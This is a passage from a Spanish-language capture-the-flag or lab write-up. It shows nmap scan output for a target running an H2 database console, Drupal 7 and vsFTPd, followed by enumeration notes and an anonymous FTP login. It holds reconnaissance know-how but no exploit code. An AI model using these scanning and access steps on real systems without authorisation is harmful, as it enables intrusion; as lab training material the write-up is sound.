5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>7/2%Time<span class="o">=</span>6684889E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
SF:NULL,45E,<span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0\0\0</span><span class="s2">F</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">
SF:o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
SF:0i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l
SF:</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">
SF:t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\0\x</span><span class="s2">01</span><span class="sb">`</span><span class="se">\x</span>05<span class="se">\0\0\x</span>01<span class="se">\x</span>d8<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>0
SF:02<span class="se">\0\.\0</span>j<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0\.\0</span>J<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\</span>
SF:0:<span class="se">\0\x</span>20<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20
SF:<span class="se">\0</span>t<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>
SF:n<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\</span>
SF:0A<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0\[\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>-<span class="se">\</span>
SF:x001<span class="se">\x</span>009<span class="se">\x</span>006<span class="se">\0\]\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>
SF:s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0</span>J<span class="se">\0</span>d<span class="se">\0</span>
SF:b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i
SF:<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>003<span class="se">\x</span>004<span class="se">\x</span>005<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\</span>
SF:0g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\</span>
SF:0o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a
SF:<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\x</span>009<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\</span>
SF:0e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(</span>
SF:<span class="se">\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>005<span class="se">\x</span>005<span class="se">\0\)</span>
SF:<span class="se">\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\</span>
SF:0D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\</span>
SF:0t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>004<span class="se">\x</span>004<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>
SF:o<span class="se">\0</span>r<span class="s2">")%r(RTSPRequest,45E,"</span><span class="se">\0\0\0\0\0\0\0\x</span>05<span class="se">\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>
SF:<span class="se">\0\0</span>F<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>t
SF:<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>n<span class="se">\0</span>
SF:o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\0</span>A<span class="se">\</span>
SF:0l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\0\x</span>01<span class="sb">`</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\0</span><span class="s2">o
SF:</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0\.\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e
SF:</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">:</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">
SF:i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
SF:0a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\</span><span class="s2">
SF:x20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0\[\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">0
SF:01</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0</span><span class="s2">-</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">006</span><span class="se">\0\]\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
SF:x002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\</span><span class="s2">
SF:0g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">
SF:x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">003</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a
SF:</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x
SF:</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n
SF:</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\x</span><span class="s2">009</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.</span><span class="s2">
SF:</span><span class="se">\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\</span><span class="s2">
SF:0</span><span class="se">\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">0
SF:01</span><span class="se">\x</span><span class="s2">005</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\</span><span class="s2">
SF:0s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b
SF:</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">004</span><span class="se">\0\)\0\n\0</span><span class="s2">
SF:</span><span class="se">\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r"</span><span class="o">)</span><span class="p">;</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>El puerto 80 corre un servicio web el cual usa como gestor de contenido un Drupal de versi√≥n 7 <a href="https://www.drupal.org/drupal-7.0/es">https://www.drupal.org/drupal-7.0/es</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>El puerto 21 esta abierto y corre <code class="language-plaintext highlighter-rouge">FTP</code> el cual tiene habilitado el <code class="language-plaintext highlighter-rouge">FTP</code> Anonymous el cual quiere decir que podemos habilitarnos sin necesidad de proporcionar contrase√±a.</p>
  </li>
  <li>
    <p>Si nos conectamos vemos que no hay nada dentro del directorio <code class="language-plaintext highlighter-rouge">messages</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ftp 10.10.10.102
Connected to 10.10.10.102.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.102:miguel<span class="o">)</span>: anonymous
230 Login successful.
